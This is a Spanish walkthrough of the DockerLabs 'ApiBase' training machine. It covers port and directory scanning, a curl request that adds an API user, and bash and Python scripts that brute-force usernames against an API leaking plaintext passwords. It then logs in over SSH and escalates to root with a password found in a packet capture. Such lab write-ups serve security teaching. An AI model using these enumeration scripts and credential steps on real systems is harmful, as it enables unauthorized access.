---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# ApiBase DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip apibase.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh apibase.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-27 09:40 EST
Nmap scan report for 172.17.0.2
Host is up (0.000025s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u4 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:ab:09:61:00:7b:cc:18:48:8e:bf:8d:3d:e4:cd:b5 (RSA)
|   256 42:0c:71:44:7c:13:ba:8f:b7:82:35:f2:b3:f7:b9:ff (ECDSA)
|_  256 85:95:6c:96:ac:a1:f0:3e:1e:0d:c1:c8:b0:6f:bb:1d (ED25519)
5000/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.9.2)
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: Werkzeug/1.0.1 Python/3.9.2
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.24 seconds
```

Si entramos al puerto `5000` veremos un apartado de una `API` por lo que ya sabremos que contiene una `API` y podremos intentar ver por donde tirar para ver si tiene alguna posible vulnerabilidad:

<figure><img src="../../.gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>

Vamos a realizar un poco de `fuzzing`:

## Gobuster

```shell
gobuster dir -u http://<IP>:5000/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2:5000/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/add                  (Status: 405) [Size: 178]
/console              (Status: 400) [Size: 192]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos dos rutas bastante interesantes, si entramos en `/add` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (271).png" alt=""><figcaption></figcaption></figure>

Vemos que el metodo no es el correcto por lo que vamos a intentar hacerlo de esta forma, ya que en la parte principal nos indica que podremos añadir un usuario, pero no podemos desde la web, por lo que haremos haciendo un `POST`, pero tendremos que seguir la estructura que pide para poder añadir un usuario.

Tras varios intentos di con la clave de como tiene que ir estructurado, seria de la sigueinte forma:

```shell
curl -X POST "http://<IP>:5000/add" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "username=John&email=john@example.com&password=123456"
```

Info:

```
{
  "message": "User added"
}
```

Como podremos ver acabamos de añadir al usuario `John` con la contraseña `123456`, ahora que tenemos un usuario añadido vamos a ver si se añadio de forma correcta con el otro directorio llamado `/users` de la siguiente forma:

```shell
curl -X GET "http://<IP>:5000/users?username=John"
```

Info:

```
[
  [
    3, 
    "John", 
    "123456"
  ]
]
```

Vemos que si lo tenemos añadido y somos el `ID` numero `3`, vamos a realizar una fuerza bruta de usuarios creando un script.

> findUserAPI.sh

```bash
#!/bin/bash

# Asumiendo que tienes un archivo users.txt con nombres de usuario
while read username; do
  response=$(curl -s "http://<IP>:5000/users?username=${username}")
  if [[ "$response" != *"User not found"* ]]; then
    echo "Usuario encontrado: $username"
    echo "$response"
  fi
done < users.txt
```

En `python3` seria con este otro script:

> findUserAPI.py

```python
import subprocess

# URL base de la API
url = "http://172.17.0.2:5000/users?username={}"

# Función para leer el diccionario desde un archivo
def load_usernames_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            # Leemos cada línea y eliminamos saltos de línea
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(f"El archivo {file_path} no se encuentra.")
        return []

# Función para hacer la solicitud con curl
def check_user(username):
    # Formateamos la URL con el nombre de usuario
    cmd = f"curl -s -X GET \"{url.format(username)}\""
    
    # Ejecutamos el comando curl y obtenemos la salida
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

    # Si la respuesta no contiene "User not found", es un usuario válido
    if '"error": "User not found"' not in result.stdout:
        print(f"Usuario válido encontrado: {username}")

# Main
if __name__ == "__main__":
    # Carga el diccionario de usuarios desde el archivo
    file_path = 'diccionario.txt'  # Cambia el nombre si es necesario
    usernames = load_usernames_from_file(file_path)
    
    if usernames:
        # Si el diccionario no está vacío, realizamos el fuzzing
        for username in usernames:
            check_user(username)
    else:
        print("No se cargaron usuarios desde el archivo.")
```

En mi caso utilizare el de `bash`, vamos a utilizar un diccionario de usuario de `SecList` para probar:

## Escalate user pingu

URL = [Diccionario Users SecList](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames-dup.txt)

Y lo renombraremos a `users.txt` para que lo pille bien el script, echo esto lo ejecutaremos de la siguiente forma:

```shell
bash findUserAPI.sh
```

Info:

```
Usuario encontrado: pingu
[
  [
    1, 
    "pingu", 
    "your_password"
  ], 
  [
    2, 
    "pingu", 
    "pinguinasio"
  ]
]
```

Veremos que hemos encontrado un usuario con `2` `IDs`, vamos a probar a meternos por `SSH` con el usuario `pingu` y con la contraseña del `ID` numero `2`.

### SSH

```shell
ssh pingu@<IP>
```

Metemos como contraseña `pinguinasio` y veremos que estamos dentro.

## Escalate Privileges

Si leemos el siguiente archivo veremos lo siguiente:

```shell
cd /home
cat network.pcap
```

Info:

```
�ò����&�gVF((E(@"���P .�&�g@G((E(@O��P [�&�g�G((E(@"���P .�&�g3H33E3@"���P aRLOGIN root
&�g
   I66E6@"���P ��PASS balulero
&�g�I66E6@O��P ��Access Denied
```

Veremos que aparece las credenciales y podemos deducir que puede ser de `root`.

```shell
su root
```

Metemos como contraseña `balulero` y veremos que somos `root`, por lo que habremos terminado la maquina.
